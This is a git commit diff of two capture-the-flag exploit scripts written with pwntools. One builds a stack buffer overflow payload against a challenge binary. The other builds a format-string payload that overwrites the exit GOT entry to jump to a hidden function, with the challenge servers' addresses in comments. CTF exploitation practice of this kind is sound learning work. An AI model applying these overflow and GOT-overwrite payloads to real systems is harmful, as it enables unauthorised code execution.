6b0ac95939d4f9b703d637a046602ebb47f88f7b
sytjason <r07922115@ntu.edu.tw>
2019-12-16 21:31:15 +0800

    watevr update

--- watevr/voting1/exp.py
+++ watevr/voting1/exp.py
@@ -1,15 +1,15 @@
 from pwn import *
 context.arch = 'amd64'
 
-#     nc 13.48.67.196 50000
+    # nc 13.48.67.196 50000
 
-r = remote('13.48.67.196', 50000)
+# r = remote('13.48.67.196', 50000)
 
-# r = process('./kamikaze')
+r = process('./kamikaze')
 secret_func = 0x400807
 
 offset = 0x7ffdbba7bbe0 - 0x7ffdbba7bba0 + 2 - 56 
-payload = 'a' * offset + p64(secret_func)
+payload = 'a' * offset 
 pause()
 
 r.sendlineafter(': ', payload)
--- watevr/voting2/exp.py
+++ watevr/voting2/exp.py
@@ -1,14 +1,19 @@
 from pwn import *
-context.arch = 'amd64'
+context.arch = 'i386'
 
-#     nc 13.48.67.196 50000
+#nc 13.53.125.206 50000
 
-# r = remote('13.48.67.196', 50000)
+# r = remote('13.53.125.206', 50000)
 
 r = process('./kamikaze2', env={"LD_PRELOAD" : "./libc-2.27.so"})
+exit_got = 0x08422024
 secret_func = 0x8420736
 
-payload = 'a' * 10000
+deadbeef = 0xdeadbeef
+
+payload = repr(fmtstr_payload(5, {exit_got: secret_func}, write_size='byte'))
+success("payload: {}".format(payload))
+
 pause()
 
 r.sendlineafter('Topic: ', payload)
